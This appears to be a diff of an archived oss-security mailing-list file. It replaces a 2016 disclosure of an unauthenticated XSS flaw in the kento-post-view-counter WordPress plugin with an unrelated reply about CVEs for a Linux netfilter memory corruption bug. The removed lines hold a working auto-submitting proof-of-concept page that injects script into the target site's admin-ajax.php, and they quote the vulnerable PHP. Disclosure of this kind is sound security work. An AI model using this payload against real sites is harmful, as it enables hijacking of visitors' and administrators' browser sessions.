@@ -1,87 +1,43 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/04/16/2
-Message-ID: <CAOmn9FTgrvG=cU61iYqAfUWmAcQe0Hc7h3E3WSfWP17-CRt_Jw@mail.gmail.com>
-Date: Sat, 16 Apr 2016 13:41:31 +0530
-From: shravan kumar <cor3sm4sh3r@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/03/10/7
+Message-ID: <20160310111636.GA15133@nxnw.org>
+Date: Thu, 10 Mar 2016 03:16:36 -0800
+From: Steve Beattie <steve@...w.org>
 To: oss-security@...ts.openwall.com
-Subject: Unauthenticated XSS Vulnerability in kento-post-view-counter Wordpress Plugin 2.8
+Cc: cve-assign@...re.org
+Subject: Re: CVE Request: Linux Kernel: Linux netfilter IPT_SO_SET_REPLACE memory corruption
 Content-Type: text/plain; charset=utf-8
 
-I would like to disclose  a Unauthenticated XSS vulnerability
-in kento-post-view-counter  plugin version 2.8 .
+Hi,
 
-The Plugin can be found at
-*https://wordpress.org/plugins/kento-post-view-counter/
-<https://wordpress.org/plugins/kento-post-view-counter/>*
+On Thu, Mar 10, 2016 at 10:25:49AM +0100, Marcus Meissner wrote:
+> >>From the P0 team at Google:
+>
+> https://code.google.com/p/google-security-research/issues/detail?id=758
+>
+> A memory corruption vulnerability exists in the IPT_SO_SET_REPLACE
+> ioctl in the netfilter code for iptables support. This ioctl is can be
+> triggered by an unprivileged user on PF_INET sockets when unprivileged
+> user namespaces are available (CONFIG_USER_NS=y). Android does not
+> enable this option, but desktop/server distributions and Chrome OS
+> will commonly enable this to allow for containers support or sandboxing.
+>
+> ...
+> 
+> I think this needs a CVE.
 
-This Bug can be triggered by unauthenticated / Authenticated user. If a
-user is sent a URL by social engineering and the user clicks the link the
-bug can be triggered.
+It likely needs two, one for the issue above,
+which has been proposed to be addressed by
+http://marc.info/?l=netfilter-devel&m=145757134822741&w=2
 
-The URL should be something like this
+and one for the unsigned integer overflow on 32bit kernels
+mentioned as an aside at the end of the original report. Proposed
+fix is http://marc.info/?l=netfilter-devel&m=145757136822750&w=2
 
-http://attackerssite.com/XSS_POC.html
-
-
-The code for XSS_POC.html is as follows:
-
-<html>
-  <body onload="document.forms['xss'].submit()" >
-    <form name="xss" action="http://targetsite/wp-admin/admin-ajax.php"
-method="POST" >
-
-  <input type="hidden" name="action" value="kento_pvc_top_geo" />
-  <input type="hidden" name="kento_pvc_geo" value="
-<script>alert(1);</script>" />
-      <input type="submit" value="Submit" />
-    </form>
-  </body>
-</html>
-
-
-
-Technical Details:
-
-The vulnerable page is
-
-wp-content/plugins/kento-post-view-counter/index.php
-
-The Code responsible for the vulnerability :
-
-LINE NO 219 onwards
-if(isset($_POST['kento_pvc_geo']))
-{
-$geo = $_POST['kento_pvc_geo'];
-}
-if(empty($geo))
-{
-$geo ="country";
-}
-.....
-....
-Line No 240
-$top_geo.= "<th scope='col' class='manage-column column-name' ><strong>"
-.ucfirst($geo)."</strong></th>";
-
-
-Line No 245
-
-$top_geo.= "<th scope='col' class='manage-column column-name' ><strong>"
-.ucfirst($geo)."</strong></th>";
-
-Line No 283
-
-echo $top_geo;
-
-The $top_geo parameter is displayed in unsafe manner without escaping HTML
-chars .
-
-The vulnerable POST parameters is:
-
-
-   - kento_pvc_geo
-
-
+Thanks.
 -- 
-Shravan Kumar
+Steve Beattie
+<sbeattie@...ntu.com>
+http://NxNW.org/~steve/
 
+Download attachment "signature.asc" of type "application/pgp-signature" (820 bytes)
